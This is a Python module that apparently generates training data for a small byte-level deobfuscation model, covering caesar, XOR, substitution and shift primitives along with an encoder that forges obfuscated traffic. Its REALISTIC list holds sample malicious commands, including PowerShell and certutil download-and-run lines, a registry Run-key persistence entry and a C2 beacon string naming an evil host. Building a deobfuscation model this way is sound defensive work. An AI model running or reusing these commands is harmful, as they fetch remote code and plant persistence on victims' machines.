"""
Deobfuscation corpus for the SLM (stage 1, exact regime).

Byte-level (vocab 256), LENGTH-PRESERVING primitives — the regime the fixed-length seq2seq SLM
owns. Length-CHANGING codecs (base64/gzip/hex) stay with the deterministic `deobf/` engine;
the two are complementary. The primitives mirror `bmoe_cyber`'s decoder skills:

  identity  : Y = X                        (expert 0 — also the loop's "halt / pad" skill)
  caesar    : Y = (X - k) mod 256          (single-byte additive key — a fixed byte permutation)
  xor       : Y = X ^ k                    (single-byte XOR key — a fixed byte permutation)
  sbox      : Y = inv_perm[X]              (custom substitution alphabet — a fixed permutation)
  shift     : Y[t] = X[t-1]  (Y[0]=X[0])   (1-position rotation — CONTEXT-dependent: output[t]
                                            depends on the NEIGHBOUR, impossible pointwise, so
                                            it forces the attention/context view)

Why a positional shift and not a rolling/CBC keystream: a keystream needs Y[t]=(X[t]-X[t-1])
mod 256, i.e. modular subtraction over 256 values — a grokking-hard arithmetic task for a tiny
expert (orthogonal to the MoE mechanism we are validating). A shift is just as context-dependent
but cleanly attention-learnable (each position copies its neighbour), so it stresses the context
stream without the arithmetic confound. Modular/keystream experts are a known-hard item deferred
to the fuzzy stage (or a smaller alphabet).

Each primitive is one expert's skill. A task is a composition; each loop step applies one skill
and is deep-supervised on the partial decode.
"""

from __future__ import annotations

import torch

from .config import DEVICE

# expert id 0 is identity (loop pad / halt); atoms map to ids 1..N-1
ATOMS = ["caesar", "xor", "sbox", "shift"]
EXPERT_ID = {"identity": 0, **{a: i + 1 for i, a in enumerate(ATOMS)}}
N_EXPERTS = len(ATOMS) + 1

CAESAR_K = 7
XOR_K = 0x5A


def make_params(seed: int = 0):
    g = torch.Generator().manual_seed(seed)
    perm = torch.randperm(256, generator=g).to(DEVICE)
    return {"perm": perm, "inv_perm": torch.argsort(perm).to(DEVICE)}


def apply_skill(name: str, X: torch.Tensor, P) -> torch.Tensor:
    if name == "identity":
        return X
    if name == "caesar":
        return (X - CAESAR_K) % 256
    if name == "xor":
        return torch.bitwise_xor(X, torch.tensor(XOR_K, device=X.device))
    if name == "sbox":
        return P["inv_perm"][X]
    if name == "shift":                  # 1-position rotation (context-dependent)
        Y = X.clone()
        Y[:, 1:] = X[:, :-1]
        return Y
    raise ValueError(name)


def compose(chain, X, P):
    for name in chain:
        X = apply_skill(name, X, P)
    return X


def _inverse_skill(name, X, P):
    """Encoder = inverse of a decoder, to forge obfuscated traffic from a revealed payload."""
    if name == "identity":
        return X
    if name == "caesar":
        return (X + CAESAR_K) % 256
    if name == "xor":
        return torch.bitwise_xor(X, torch.tensor(XOR_K, device=X.device))
    if name == "sbox":
        return P["perm"][X]
    if name == "shift":                  # lossy at the boundary (shift is not bijective)
        Y = X.clone()
        Y[:, :-1] = X[:, 1:]
        return Y
    raise ValueError(name)


def obfuscate(chain, revealed, P):
    """Build the obfuscated input X such that compose(chain, X) == revealed (exact for the
    bijective skills caesar/xor/sbox; approximate through shift)."""
    X = revealed
    for name in reversed(chain):
        X = _inverse_skill(name, X, P)
    return X


def partials(chain_padded, X, P):
    """Per-loop-step targets: bytes after applying the first j skills of the padded chain."""
    outs, cur = [], X
    for name in chain_padded:
        cur = apply_skill(name, cur, P)
        outs.append(cur)
    return outs


def pad_chain(chain, n_loop):
    return list(chain) + ["identity"] * (n_loop - len(chain))


def forced_path(chain_padded):
    return [EXPERT_ID[a] for a in chain_padded]


def rand_payload(bs, S):
    """Random bytes — full 0..255 coverage so the learned decoders generalize."""
    return torch.randint(0, 256, (bs, S), device=DEVICE)


# A few realistic payloads (printable) for demo/eval display — a subset of byte space.
REALISTIC = [
    b"IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')",
    b"cmd /c certutil -urlcache -f http://185.34.2.9/x.exe C:\\t\\x.exe",
    b"reg add HKCU\\Software\\Run /v Updater /d C:\\Users\\Public\\u.exe",
    b"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A",
    b"beacon c2=https://cdn.evil.tld/jquery.js sleep=60 jitter=15",
]


def realistic_batch(S):
    """Pack the realistic payloads into a (len(REALISTIC), S) byte tensor (pad/truncate)."""
    rows = []
    for b in REALISTIC:
        bb = (b + b" " * S)[:S]
        rows.append(list(bb))
    return torch.tensor(rows, device=DEVICE)
